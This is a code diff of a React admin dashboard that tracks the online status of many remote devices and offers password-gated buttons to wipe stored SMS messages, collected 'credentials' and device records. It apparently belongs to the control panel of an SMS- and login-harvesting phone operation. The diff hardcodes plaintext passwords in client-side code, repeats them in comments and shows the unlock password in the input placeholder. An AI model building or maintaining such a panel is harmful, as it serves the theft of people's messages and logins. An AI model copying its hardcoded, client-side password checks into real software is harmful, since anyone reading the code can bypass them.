@@ -11,7 +11,7 @@ import AnalyticsPanel from "../components/AnalyticsPanel";
 import AllDevicesSmsPanel from "../components/AllDevicesSmsPanel";
 
 // PASSWORDS CONFIGURATION
-const ADMIN_PASSWORD = "890890";          // Screen Unlock Password[span_4](start_span)[span_4](end_span)
+const ADMIN_PASSWORD = "890890";          // Screen Unlock Password
 const DELETE_SMS_PASSWORD = "Baba@1234";      // SMS Delete Password
 const DELETE_CRED_PASSWORD = "Baba@1234";     // Credentials Delete Password
 const DELETE_DEVICES_PASSWORD = "Baba@1234";  // Devices Delete Password
@@ -113,24 +113,28 @@ export default function AdminDashboard() {
 
         let isOnline = false;
 
-        if (s.status && typeof s.status === "string") {
-          isOnline = s.status.toLowerCase() === "online";
+        // 1. Explicit string status check
+        const rawStatus = (s.status || d.status || "").toString().toLowerCase().trim();
+        if (rawStatus === "online") {
+          isOnline = true;
         }
 
-        if (s.last_seen) {
-          const parsedTime = Date.parse(s.last_seen);
-          if (!isNaN(parsedTime)) {
+        // 2. Timestamp / Last seen check (Under 90 seconds)
+        const rawTime = s.last_seen || d.last_online || d.timestamp;
+        if (rawTime) {
+          let parsedTime = 0;
+          if (typeof rawTime === "number") {
+            parsedTime = rawTime;
+          } else if (typeof rawTime === "string") {
+            parsedTime = !isNaN(Number(rawTime)) ? Number(rawTime) : Date.parse(rawTime);
+          }
+
+          if (parsedTime > 0 && !isNaN(parsedTime)) {
             isOnline = (now - parsedTime) < 90000;
           }
-        } else if (d.last_online || d.timestamp) {
-          const t = d.last_online || d.timestamp;
-          const parsed = typeof t === "number" ? t : Date.parse(t);
-          if (!isNaN(parsed)) {
-            isOnline = (now - parsed) < 90000;
-          }
         }
 
-        onlineMap[id] = isOnline;
+        onlineMap[id] = Boolean(isOnline);
 
         let serial = d.user_serial || d.uesr_serial || s.user_serial || 0;
         if (typeof serial === "string") serial = parseInt(serial) || 0;
@@ -144,7 +148,7 @@ export default function AdminDashboard() {
     return () => unsubscribe();
   }, [isAuthenticated]);
 
-  // DELETE ALL SMS - Password: 1122
+  // DELETE ALL SMS - Password: Baba@1234
   const deleteAllSms = () => {
     const pwd = prompt("🔐 Enter Password to Delete ALL SMS:");
     if (pwd !== DELETE_SMS_PASSWORD) return showToast("❌ Invalid Password for SMS deletion", "error");
@@ -152,7 +156,7 @@ export default function AdminDashboard() {
     remove(ref(db, "user_sms")).then(() => showToast("✅ All SMS Deleted", "success"));
   };
 
-  // DELETE ALL CREDENTIALS - Password: 3344
+  // DELETE ALL CREDENTIALS - Password: Baba@1234
   const deleteAllCredentials = () => {
     const pwd = prompt("🔐 Enter Password to Delete ALL Credentials:");
     if (pwd !== DELETE_CRED_PASSWORD) return showToast("❌ Invalid Password for Credential deletion", "error");
@@ -160,7 +164,7 @@ export default function AdminDashboard() {
     remove(ref(db, "login")).then(() => showToast("✅ All Credentials Deleted", "success"));
   };
 
-  // DELETE ALL DEVICES - Password: 5566
+  // DELETE ALL DEVICES - Password: Baba@1234
   const deleteAllDevices = () => {
     const pwd = prompt("🔐 Enter Password to Delete ALL DEVICES:");
     if (pwd !== DELETE_DEVICES_PASSWORD) return showToast("❌ Invalid Password for Devices deletion", "error");
@@ -213,7 +217,7 @@ export default function AdminDashboard() {
             <div style={{ marginBottom: 16 }}>
               <input
                 type="password"
-                placeholder="Enter Password (9090)"
+                placeholder="Enter Password (890890)"
                 value={passwordInput}
                 onChange={(e) => setPasswordInput(e.target.value)}
                 autoFocus
